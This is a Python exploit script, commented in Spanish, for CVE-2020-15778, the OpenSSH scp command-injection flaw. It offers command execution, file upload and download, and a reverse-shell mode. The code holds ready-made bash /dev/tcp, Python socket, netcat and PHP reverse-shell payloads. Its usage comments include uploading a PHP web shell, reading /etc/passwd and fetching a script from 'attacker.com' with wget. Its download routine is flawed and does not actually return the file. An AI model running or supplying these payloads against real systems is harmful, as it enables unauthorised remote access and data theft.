#!/usr/bin/env python3
# cve_2020_15778.py

# Ejecutar comando simple
# python3 cve_2020_15778.py 192.168.1.100 -c "id"

# Subir archivo
# python3 cve_2020_15778.py 192.168.1.100 --upload shell.php /var/www/html/shell.php

# Descargar archivo
# python3 cve_2020_15778.py 192.168.1.100 --download /etc/passwd ./passwd_copy.txt

# Reverse shell
# python3 cve_2020_15778.py 192.168.1.100 --reverse-shell --lhost 192.168.1.50 --lport 4444

# Usar script bash simple
# ./CVE-2020-15778_exploit.sh 192.168.1.100 22 root "wget http://attacker.com/shell.sh -O /tmp/shell.sh"


import sys
import subprocess
import os
import time
import argparse

class CVE202015778Exploit:
    def __init__(self, target, port=22, username='root'):
        self.target = target
        self.port = port
        self.username = username
        self.temp_files = []
    
    def create_payload(self, command):
        """Crea payload malicioso para SCP"""
        timestamp = str(int(time.time()))
        filename = f"exploit_{timestamp}.txt"
        
        # Crear archivo temporal
        with open(filename, 'w') as f:
            f.write("CVE-2020-15778 Exploit Payload")
        
        self.temp_files.append(filename)
        return filename, f"'|{command} #"
    
    def execute_command(self, command):
        """Ejecuta comando remoto mediante la vulnerabilidad"""
        try:
            local_file, remote_path = self.create_payload(command)
            
            print(f"[+] Executing: {command}")
            print(f"[+] Local file: {local_file}")
            print(f"[+] Remote path: {remote_path}")
            
            # Construir comando SCP
            scp_cmd = [
                'scp',
                '-P', str(self.port),
                local_file,
                f"{self.username}@{self.target}:{remote_path}"
            ]
            
            # Ejecutar SCP (redirigir salida para silenciar)
            result = subprocess.run(
                scp_cmd,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                timeout=10
            )
            
            return result.returncode == 0
            
        except subprocess.TimeoutExpired:
            print("[-] Timeout occurred")
            return False
        except Exception as e:
            print(f"[-] Error: {e}")
            return False
    
    def reverse_shell(self, lhost, lport):
        """Establece reverse shell"""
        payloads = {
            'bash': f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1",
            'python': f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{lhost}\",{lport}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
            'nc': f"nc -e /bin/sh {lhost} {lport}",
            'php': f"php -r '\$sock=fsockopen(\"{lhost}\",{lport});exec(\"/bin/sh -i <&3 >&3 2>&3\");'"
        }
        
        print("[+] Attempting reverse shell...")
        for name, payload in payloads.items():
            print(f"[+] Trying {name} payload")
            if self.execute_command(payload):
                print(f"[+] {name} payload sent successfully")
                return True
        
        return False
    
    def upload_file(self, local_file, remote_path):
        """Sube archivo al sistema objetivo"""
        payload = f"cat > {remote_path} < {local_file}"
        return self.execute_command(payload)
    
    def download_file(self, remote_file, local_path):
        """Descarga archivo del sistema objetivo"""
        payload = f"cat {remote_file} > {local_path}"
        return self.execute_command(payload)
    
    def cleanup(self):
        """Limpia archivos temporales"""
        for file in self.temp_files:
            try:
                os.remove(file)
            except:
                pass
        self.temp_files = []
    
    def __del__(self):
        self.cleanup()

def main():
    parser = argparse.ArgumentParser(description='CVE-2020-15778 OpenSSH SCP Client Command Injection Exploit')
    parser.add_argument('target', help='Target IP address')
    parser.add_argument('-p', '--port', type=int, default=22, help='SSH port (default: 22)')
    parser.add_argument('-u', '--username', default='root', help='SSH username (default: root)')
    parser.add_argument('-c', '--command', help='Command to execute')
    parser.add_argument('--reverse-shell', action='store_true', help='Setup reverse shell')
    parser.add_argument('--lhost', help='Listener IP for reverse shell')
    parser.add_argument('--lport', type=int, help='Listener port for reverse shell')
    parser.add_argument('--upload', nargs=2, metavar=('LOCAL', 'REMOTE'), help='Upload file')
    parser.add_argument('--download', nargs=2, metavar=('REMOTE', 'LOCAL'), help='Download file')
    
    args = parser.parse_args()
    
    if not any([args.command, args.reverse_shell, args.upload, args.download]):
        parser.print_help()
        sys.exit(1)
    
    exploit = CVE202015778Exploit(args.target, args.port, args.username)
    
    try:
        if args.command:
            success = exploit.execute_command(args.command)
            print(f"[+] Command execution: {'Success' if success else 'Failed'}")
        
        elif args.reverse_shell:
            if not args.lhost or not args.lport:
                print("[-] LHOST and LPORT required for reverse shell")
                sys.exit(1)
            exploit.reverse_shell(args.lhost, args.lport)
            print("[+] Reverse shell payloads sent. Start your listener!")
            print(f"nc -lvnp {args.lport}")
        
        elif args.upload:
            local_file, remote_path = args.upload
            success = exploit.upload_file(local_file, remote_path)
            print(f"[+] File upload: {'Success' if success else 'Failed'}")
        
        elif args.download:
            remote_file, local_path = args.download
            success = exploit.download_file(remote_file, local_path)
            print(f"[+] File download: {'Success' if success else 'Failed'}")
    
    except KeyboardInterrupt:
        print("\n[-] Interrupted by user")
    finally:
        exploit.cleanup()

if __name__ == "__main__":
    main()
